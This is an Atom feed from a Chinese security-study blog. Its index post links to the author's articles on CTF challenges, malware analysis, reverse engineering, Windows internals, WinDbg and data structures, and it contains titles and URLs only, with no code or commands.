<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>findream&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-09-10T10:05:45.961Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>findream</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>博客总览</title>
    <link href="http://yoursite.com/2099/12/31/%E5%8D%9A%E5%AE%A2%E6%80%BB%E8%A7%88/"/>
    <id>http://yoursite.com/2099/12/31/博客总览/</id>
    <published>2099-12-31T06:02:11.000Z</published>
    <updated>2018-09-10T10:05:45.961Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;博客数据分为10类，逆向爱好者可以参考借鉴。<br><a id="more"></a></p><h2 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h2><ul><li><p><font color="#1E90FF"><strong>安全杂项例题:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/10/14/安全杂项例题/" target="_blank" rel="external">https://findream.github.io/2017/10/14/安全杂项例题/</a></p></li><li><p><font color="#1E90FF"><strong>逆向工程例题:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/11/22/逆向工程例题/" target="_blank" rel="external">https://findream.github.io/2017/11/22/逆向工程例题/</a></p></li><li><p><font color="#1E90FF"><strong>2015年强网杯MISC和RE:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/09/2015年强网杯/" target="_blank" rel="external">https://findream.github.io/2018/04/09/2015年强网杯/</a></p></li><li><p><font color="#1E90FF"><strong>XCTF嘉年华资格赛</strong></font>:&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/22/XCTF嘉年华比赛试题/" target="_blank" rel="external">https://findream.github.io/2018/05/22/XCTF嘉年华比赛试题/</a></p></li><li><p><font color="#1E90FF"><strong>看雪2017CTF</strong></font>:&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/05/看雪CTF2017/" target="_blank" rel="external">https://findream.github.io/2018/05/05/看雪CTF2017/</a></p></li><li><p><font color="#1E90FF"><strong>GCTF解析</strong></font>:&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/26/GCTF/" target="_blank" rel="external">https://findream.github.io/2018/05/26/GCTF/</a></p></li><li><p><font color="#1E90FF"><strong>西电CTF(moectf):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/02/西电CTF(moectf" target="_blank" rel="external">https://findream.github.io/2018/08/02/西电CTF(moectf)/</a>/)</p></li><li><p><font color="#1E90FF"><strong>北邮自招CTF-Re</strong></font>:&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/01/北邮自招CTF/" target="_blank" rel="external">https://findream.github.io/2018/08/01/北邮自招CTF/</a></p></li><li><p><font color="#1E90FF"><strong>巅峰极客CTF:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/28/巅峰极客CTF/" target="_blank" rel="external">https://findream.github.io/2018/07/28/巅峰极客CTF/</a></p></li><li><font color="#1E90FF"><strong>BugKuCTF</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/14/BugKu_CTF/" target="_blank" rel="external">https://findream.github.io/2018/08/14/BugKu_CTF/</a></li><li><font color="#1E90FF"><strong>网鼎杯CTF</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/21/网鼎杯CTF/#more" target="_blank" rel="external">https://findream.github.io/2018/08/21/网鼎杯CTF/#more</a></li><li><font color="#1E90FF"><strong>WhaleCTF</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/09/06/WhaleCTF/" target="_blank" rel="external">https://findream.github.io/2018/09/06/WhaleCTF/</a></li></ul><h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><ul><li><p><font color="#1E90FF"><strong>Linux常见命令(2)常见命令:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/28/Linux常见命令_2_其他命令/" target="_blank" rel="external">https://findream.github.io/2018/04/28/Linux常见命令<em>2</em>其他命令/</a></p></li><li><p><font color="#1E90FF"><strong>Linux常见命令(3)软件包管理:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/07/Linux常见命令_3_软件包管理/" target="_blank" rel="external">https://findream.github.io/2018/05/07/Linux常见命令<em>3</em>软件包管理/</a></p></li><li><p><font color="#1E90FF"><strong>Linux常见命令(4)用户和组管理:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/17/Linux常见命令_4_用户和用户组管理/" target="_blank" rel="external">https://findream.github.io/2018/05/17/Linux常见命令<em>4</em>用户和用户组管理/</a></p></li><li><p><font color="#1E90FF"><strong>Linux常见命令(5)权限管理:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/20/Linux常见命令_5_权限管理/" target="_blank" rel="external">https://findream.github.io/2018/05/20/Linux常见命令<em>5</em>权限管理/</a></p></li><li><p><font color="#1E90FF"><strong>Linux常见命令(6)shell基础:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/25/Linux常见命令_6_shell基础/" target="_blank" rel="external">https://findream.github.io/2018/05/25/Linux常见命令_6_shell基础/</a></p></li><li><p><font color="#1E90FF"><strong>Linux常见命令(7)shell命令:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/06/10/Linux常见命令_7_shell编程/" target="_blank" rel="external">https://findream.github.io/2018/06/10/Linux常见命令_7_shell编程/</a></p></li><li><p><font color="#1E90FF"><strong>Linux常见命令(8)进程管理:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/06/22/Linux常见命令_8_进程管理/" target="_blank" rel="external">https://findream.github.io/2018/06/22/Linux常见命令<em>8</em>进程管理/</a></p></li></ul><h2 id="病毒分析相关"><a href="#病毒分析相关" class="headerlink" title="病毒分析相关"></a>病毒分析相关</h2><ul><li><p><font color="#1E90FF"><strong>搭建inetsim虚拟分析网络:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/02/10/搭建inetsim虚拟分析网络/" target="_blank" rel="external">https://findream.github.io/2018/02/10/搭建inetsim虚拟分析网络/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(1):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/01/12/病毒分析技术_1_/" target="_blank" rel="external">https://findream.github.io/2018/01/12/病毒分析技术<em>1</em>/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(2):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/02/病毒分析技术_2_/" target="_blank" rel="external">https://findream.github.io/2018/03/02/病毒分析技术<em>2</em>/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(3)–小型硬盘加密病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/05/病毒分析技术_3_/" target="_blank" rel="external">https://findream.github.io/2018/03/05/病毒分析技术<em>3</em>/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(4)–U盘病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/08/病毒分析技术_4_U盘病毒/" target="_blank" rel="external">https://findream.github.io/2018/03/08/病毒分析技术_4_U盘病毒/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(5)–骷髅病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/15/病毒分析技术_5_骷髅病毒/" target="_blank" rel="external">https://findream.github.io/2018/03/15/病毒分析技术<em>5</em>骷髅病毒/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(6)–熊猫烧香病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/25/病毒分析技术_6_熊猫烧香病毒/" target="_blank" rel="external">https://findream.github.io/2018/03/25/病毒分析技术<em>6</em>熊猫烧香病毒/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(7):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/29/病毒分析技术_7_/" target="_blank" rel="external">https://findream.github.io/2018/03/29/病毒分析技术<em>7</em>/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(8)–芦苇病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/14/病毒分析技术_8_芦苇病毒/" target="_blank" rel="external">https://findream.github.io/2018/04/14/病毒分析技术<em>8</em>芦苇病毒/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(9)–文件下载者病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/08/病毒分析技术_9_文件下载者/" target="_blank" rel="external">https://findream.github.io/2018/07/08/病毒分析技术<em>9</em>文件下载者/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(10)–MBR病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/23/病毒分析技术_10_MBR修改病毒/" target="_blank" rel="external">https://findream.github.io/2018/07/23/病毒分析技术_10_MBR修改病毒/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(11)–文件下载者病毒变种:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/25/病毒分析技术_11_文件下载者变种1/" target="_blank" rel="external">https://findream.github.io/2018/07/25/病毒分析技术<em>11</em>文件下载者变种1/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(12)–GandGrab勒索病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/31/病毒分析技术_12_GandCrab勒索病毒/" target="_blank" rel="external">https://findream.github.io/2018/07/31/病毒分析技术_12_GandCrab勒索病毒/</a></p></li><li><p><font color="#1E90FF"><strong>病毒分析技术(13)–Wanncry勒索病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/08/病毒分析技术_13_WannaCry勒索病毒/" target="_blank" rel="external">https://findream.github.io/2018/08/08/病毒分析技术_13_WannaCry勒索病毒/</a></p></li><li><font color="#1E90FF"><strong>病毒分析技术_14_Wannamine2.0挖矿病毒</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/09/03/病毒分析技术_14_Wannamine2.0挖矿病毒/#more" target="_blank" rel="external">https://findream.github.io/2018/09/03/病毒分析技术_14_Wannamine2.0挖矿病毒/#more</a></li><li><font color="#1E90FF"><strong>病毒分析技术_15_sata勒索病毒:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/09/10/病毒分析技术_15_sata勒索病毒/" target="_blank" rel="external">https://findream.github.io/2018/09/10/病毒分析技术_15_sata勒索病毒/</a></li></ul><h2 id="C-相关"><a href="#C-相关" class="headerlink" title="C++相关"></a>C++相关</h2><ul><li><p><font color="#1E90FF"><strong>第二章&lt;变量，语句&gt;:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/11/C++第二章_变量和基本类型/" target="_blank" rel="external">https://findream.github.io/2018/04/11/C++第二章_变量和基本类型/</a></p></li><li><p><font color="#1E90FF"><strong>第三章&lt;字符串<em>向量</em>数组&gt;:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/22/C++第三章_字符串_向量_数组/" target="_blank" rel="external">https://findream.github.io/2018/03/22/C++第三章<em>字符串</em>向量_数组/</a></p></li><li><p><font color="#1E90FF"><strong>第四章&lt;运算符&gt;:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/30/C++第四章_运算符/" target="_blank" rel="external">https://findream.github.io/2018/03/30/C++第四章_运算符/</a></p></li><li><p><font color="#1E90FF"><strong>C++第五章&lt;语句&gt;:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/08/C++第五章_语句/" target="_blank" rel="external">https://findream.github.io/2018/04/08/C++第五章_语句/</a></p></li><li><p><font color="#1E90FF"><strong>第六章&lt;函数&gt;:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/11/C++第六章_函数/" target="_blank" rel="external">https://findream.github.io/2018/04/11/C++第六章_函数/</a></p></li></ul><h2 id="逆向工程相关"><a href="#逆向工程相关" class="headerlink" title="逆向工程相关"></a>逆向工程相关</h2><ul><li><p><font color="#1E90FF"><strong>浅谈脱壳技术:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/10/25/浅探脱壳技术/" target="_blank" rel="external">https://findream.github.io/2017/10/25/浅探脱壳技术/</a></p></li><li><p><font color="#1E90FF"><strong>六类语言的逆向思路:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/11/02/六种常见语言的逆向思路/" target="_blank" rel="external">https://findream.github.io/2017/11/02/六种常见语言的逆向思路/</a></p></li><li><p><font color="#1E90FF"><strong>switch结构逆向分析:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/11/06/switch结构逆向分析/" target="_blank" rel="external">https://findream.github.io/2017/11/06/switch结构逆向分析/</a></p></li><li><p><font color="#1E90FF"><strong>OD断点设置技巧:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/11/10/OD断点设置技巧/" target="_blank" rel="external">https://findream.github.io/2017/11/10/OD断点设置技巧/</a></p></li><li><p><font color="#1E90FF"><strong>VB程序调试练习:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/11/27/VB程序逆向练习/" target="_blank" rel="external">https://findream.github.io/2017/11/27/VB程序逆向练习/</a></p></li><li><p><font color="#1E90FF"><strong>局部线程存储技术:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/12/02/线程局部存储技术/" target="_blank" rel="external">https://findream.github.io/2017/12/02/线程局部存储技术/</a></p></li><li><p><font color="#1E90FF"><strong>给逆向工作者的忠告:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/12/09/给逆向分析人员的忠告/" target="_blank" rel="external">https://findream.github.io/2017/12/09/给逆向分析人员的忠告/</a></p></li><li><p><font color="#1E90FF"><strong>浅谈Base64加密原理及应用:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/12/24/浅谈Base64的加密与解密/" target="_blank" rel="external">https://findream.github.io/2017/12/24/浅谈Base64的加密与解密/</a></p></li><li><p><font color="#1E90FF"><strong>Zw和Nt的区别:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/01/23/内核Nt和Zw函数区别/" target="_blank" rel="external">https://findream.github.io/2018/01/23/内核Nt和Zw函数区别/</a></p></li><li><p><font color="#1E90FF"><strong>浅谈SEH技术:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/01/24/浅谈SEH技术/" target="_blank" rel="external">https://findream.github.io/2018/01/24/浅谈SEH技术/</a></p></li><li><p><font color="#1E90FF"><strong>反向shell:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/02/02/反向shell技术/" target="_blank" rel="external">https://findream.github.io/2018/02/02/反向shell技术/</a></p></li><li><p><font color="#1E90FF"><strong>用户态下的Rootkit进程隐藏技术:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/02/07/用户态下的RootKit进程隐藏技术/" target="_blank" rel="external">https://findream.github.io/2018/02/07/用户态下的RootKit进程隐藏技术/</a></p></li><li><p><font color="#1E90FF"><strong>反汇编对抗技术:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/02/17/对抗反汇编技术/" target="_blank" rel="external">https://findream.github.io/2018/02/17/对抗反汇编技术/</a></p></li><li><p><font color="#1E90FF"><strong>反调试技术:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/02/19/反调试技术/" target="_blank" rel="external">https://findream.github.io/2018/02/19/反调试技术/</a></p></li><li><p><font color="#1E90FF"><strong>常见脱壳思路:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/15/常见壳的脱壳思路/" target="_blank" rel="external">https://findream.github.io/2018/07/15/常见壳的脱壳思路/</a></p></li><li><p><font color="#1E90FF"><strong>angr使用笔记：</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/27/二进制分析工具angr使用笔记/" target="_blank" rel="external">https://findream.github.io/2018/08/27/二进制分析工具angr使用笔记/</a></p></li></ul><h2 id="深入解析windows操作系统"><a href="#深入解析windows操作系统" class="headerlink" title="深入解析windows操作系统"></a>深入解析windows操作系统</h2><ul><li><p><font color="#1E90FF"><strong>windows API:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/02/10/Windows_API_函数/" target="_blank" rel="external">https://findream.github.io/2018/02/10/Windows<em>API</em>函数/</a></p></li><li><p><font color="#1E90FF"><strong>windows系统机制–陷阱分发:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/31/《Windows%20Internals》第三章_系统机制/" target="_blank" rel="external">https://findream.github.io/2018/03/31/《Windows%20Internals》第三章_系统机制/</a></p></li><li><p><font color="#1E90FF"><strong>系统机制-映像加载器:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/26/《Windows%20Internals》第三章_映像加载器/" target="_blank" rel="external">https://findream.github.io/2018/04/26/《Windows%20Internals》第三章_映像加载器/#more</a></p></li><li><p><font color="#1E90FF"><strong>全局标志和windows内核事件跟踪:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/26/《Windows%20Internals》第三章_全局标志和内核事件跟踪/" target="_blank" rel="external">https://findream.github.io/2018/04/26/《Windows%20Internals》第三章_全局标志和内核事件跟踪/</a></p></li><li><p><font color="#1E90FF"><strong>第三章:系统机制-同步:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/08/《Windows%20Internals》第三章_同步/" target="_blank" rel="external">https://findream.github.io/2018/04/08/《Windows%20Internals》第三章_同步/</a></p></li><li><p><font color="#1E90FF"><strong>注册表:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/06/04/《Windows%20Internals》第四章_注册表/" target="_blank" rel="external">https://findream.github.io/2018/06/04/《Windows%20Internals》第四章_注册表/</a></p></li></ul><h2 id="数据结构和算法相关"><a href="#数据结构和算法相关" class="headerlink" title="数据结构和算法相关"></a>数据结构和算法相关</h2><ul><li><p><font color="#1E90FF"><strong>八皇后问题:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/10/19/算法练习1--八皇后问题/" target="_blank" rel="external">https://findream.github.io/2017/10/19/算法练习1–八皇后问题/</a></p></li><li><p><font color="#1E90FF"><strong>浅谈数据结构之二叉树:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/11/05/浅谈数据结构之二叉树/" target="_blank" rel="external">https://findream.github.io/2017/11/05/浅谈数据结构之二叉树/</a></p></li><li><p><font color="#1E90FF"><strong>浅谈数据结构之队列:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/11/09/浅谈数据结构之队列/" target="_blank" rel="external">https://findream.github.io/2017/11/09/浅谈数据结构之队列/</a></p></li><li><p><font color="#1E90FF"><strong>数据结构之栈:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/11/12/浅谈数据结构之栈/" target="_blank" rel="external">https://findream.github.io/2017/11/12/浅谈数据结构之栈/</a></p></li><li><p><font color="#1E90FF"><strong>浅谈hash算法前世今生:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/11/18/浅探hash算法的前世今生/" target="_blank" rel="external">https://findream.github.io/2017/11/18/浅探hash算法的前世今生/</a></p></li><li><p><font color="#1E90FF"><strong>XUPT_ACM比赛解析:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/18/XUPT-ACM比赛题解/" target="_blank" rel="external">https://findream.github.io/2018/03/18/XUPT-ACM比赛题解/</a></p></li><li><p><font color="#1E90FF"><strong>动态规划–编辑距离问题:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/24/动态规划_编辑距离/" target="_blank" rel="external">https://findream.github.io/2018/05/24/动态规划_编辑距离/</a></p></li></ul><h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><ul><li><p><font color="#1E90FF"><strong>Mysql基本使用:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/10/14/MySql基本操作/" target="_blank" rel="external">https://findream.github.io/2017/10/14/MySql基本操作/</a></p></li><li><p><font color="#1E90FF"><strong>堆和栈的区别(内存和数据结构角度):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/10/17/堆栈的区别%EF%BC%88内存和数据结构角度%EF%BC%89/" target="_blank" rel="external">https://findream.github.io/2017/10/17/堆栈的区别%EF%BC%88内存和数据结构角度%EF%BC%89/</a></p></li><li><p><font color="#1E90FF"><strong>网协纳新免试题:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2017/10/24/网协面试题/" target="_blank" rel="external">https://findream.github.io/2017/10/24/网协面试题/</a></p></li><li><p><font color="#1E90FF"><strong>重新配置Hexo博客:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/01/29/重新配置hexo博客/" target="_blank" rel="external">https://findream.github.io/2018/01/29/重新配置hexo博客/</a></p></li><li><p><font color="#1E90FF"><strong>CVE-2017-16995本地提权漏洞:</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/03/23/CVE-2017-16995本地提权漏洞复现/" target="_blank" rel="external">https://findream.github.io/2018/03/23/CVE-2017-16995本地提权漏洞复现/</a></p></li></ul><h2 id="windbg学习笔记"><a href="#windbg学习笔记" class="headerlink" title="windbg学习笔记"></a>windbg学习笔记</h2><ul><li><p><font color="#1E90FF"><strong>windbg学习笔记(1):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/04/05/windbg学习笔记_1_/" target="_blank" rel="external">https://findream.github.io/2018/04/05/windbg学习笔记<em>1</em>/</a></p></li><li><p><font color="#1E90FF"><strong>windbg学习笔记(2):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/17/windbg学习笔记_2_/" target="_blank" rel="external">https://findream.github.io/2018/07/17/windbg学习笔记<em>2</em>/</a></p></li><li><p><font color="#1E90FF"><strong>windbg学习笔记(3):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/19/windbg学习笔记_3_/" target="_blank" rel="external">https://findream.github.io/2018/07/19/windbg学习笔记<em>3</em>/</a></p></li><li><p><font color="#1E90FF"><strong>windbg学习笔记(4):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/22/windbg学习笔记_4_/" target="_blank" rel="external">https://findream.github.io/2018/07/22/windbg学习笔记<em>4</em>/</a></p></li><li><p><font color="#1E90FF"><strong>windbg学习笔记(5)–内核调试(1):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/25/windbg学习笔记_5_内核调试基本命令/" target="_blank" rel="external">https://findream.github.io/2018/07/25/windbg学习笔记<em>5</em>内核调试基本命令/</a></p></li><li><p><font color="#1E90FF"><strong>windbg学习笔记(6)–内核调试(2):</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/07/26/windbg学习笔记_6_/" target="_blank" rel="external">https://findream.github.io/2018/07/26/windbg学习笔记<em>6</em>/</a></p></li></ul><h2 id="windows-PE结构"><a href="#windows-PE结构" class="headerlink" title="windows PE结构"></a>windows PE结构</h2><ul><li><p><font color="#1E90FF"><strong><windows pe="">延迟加载导入表:</windows></strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/14/《windows%20PE》延迟加载表/" target="_blank" rel="external">https://findream.github.io/2018/05/14/《windows%20PE》延迟加载表/</a></p></li><li><p><font color="#1E90FF"><strong><windows pe="">重定位表:</windows></strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/14/《windows%20PE》重定位表/" target="_blank" rel="external">https://findream.github.io/2018/05/14/《windows%20PE》重定位表/</a></p></li><li><p><font color="#1E90FF"><strong><windows pe="">导出表:</windows></strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/11/《windows%20PE》导出表/" target="_blank" rel="external">https://findream.github.io/2018/05/11/《windows%20PE》导出表/</a></p></li><li><p><font color="#1E90FF"><strong><windows pe="">导入表:</windows></strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/09/《windows%20PE》导入表/" target="_blank" rel="external">https://findream.github.io/2018/05/09/《windows%20PE》导入表/</a></p></li><li><p><font color="#1E90FF"><strong><windows pe="">PE文件头:</windows></strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/05/07/《windows%20PE》PE文件头/" target="_blank" rel="external">https://findream.github.io/2018/05/07/《windows%20PE》PE文件头/</a></p></li></ul><h2 id="格蠹汇编"><a href="#格蠹汇编" class="headerlink" title="格蠹汇编"></a>格蠹汇编</h2><ul><li><font color="#1E90FF"><strong>&lt;格蠹汇编&gt;<em>第9章</em>经典阅读器的经典死锁：</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/12/《格蠹汇编》_第九章_经典阅读器的经典死锁/" target="_blank" rel="external">https://findream.github.io/2018/08/12/《格蠹汇编》<em>第九章</em>经典阅读器的经典死锁/</a></li><li><font color="#1E90FF"><strong>《格蠹汇编》<em>第十章</em>转储分析双误谜团：</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/13/《格蠹汇编》_第十章_转储分析双误谜团/" target="_blank" rel="external">https://findream.github.io/2018/08/13/《格蠹汇编》<em>第十章</em>转储分析双误谜团/</a> </li><li><font color="#1E90FF"><strong>《格蠹汇编》_第13章_SDK安装程序卡壳之谜：</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/16/《格蠹汇编》_第13章_SDK安装程序卡壳之谜/" target="_blank" rel="external">https://findream.github.io/2018/08/16/《格蠹汇编》_第13章_SDK安装程序卡壳之谜/</a></li><li><font color="#1E90FF"><strong>《格蠹汇编》<em>第14章</em>是谁动了我的句柄：</strong></font>&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://findream.github.io/2018/08/16/《格蠹汇编》_第14章_是谁动了我的句柄/" target="_blank" rel="external">https://findream.github.io/2018/08/16/《格蠹汇编》<em>第14章</em>是谁动了我的句柄/</a></li><li><font color="#1E90FF"><strong>&lt;格蠹汇编&gt;<em>第21章</em>趣谈托管程序的辅助调试线程：</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/27/《格蠹汇编》_第21章_趣谈托管程序的辅助调试线程/" target="_blank" rel="external">https://findream.github.io/2018/08/27/《格蠹汇编》<em>第21章</em>趣谈托管程序的辅助调试线程/</a></li><li><font color="#1E90FF"><strong>&lt;格蠹汇编&gt;<em>第25章</em>如何调试窗口大总管：</strong></font>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://findream.github.io/2018/08/28/《格蠹汇编》_第25章_如何调试窗口大总管/" target="_blank" rel="external">https://findream.github.io/2018/08/28/《格蠹汇编》<em>第25章</em>如何调试窗口大总管/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;博客数据分为10类，逆向爱好者可以参考借鉴。&lt;br&gt;
    
    </summary>
    
      <category term="总览" scheme="http://yoursite.com/categories/%E6%80%BB%E8%A7%88/"/>
    
    
  </entry>
  
  <entry>
    <title>样本分析之Powershell</title>
    <link href="http://yoursite.com/2019/07/01/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E4%B9%8BPowershell/"/>
    <id>http://yoursite.com/2019/07/01/样本分析之Powershell/</id>
    <published>2019-07-01T07:02:11.000Z</published>
    <updated>2019-07-01T07:33:14.534Z</updated>
    
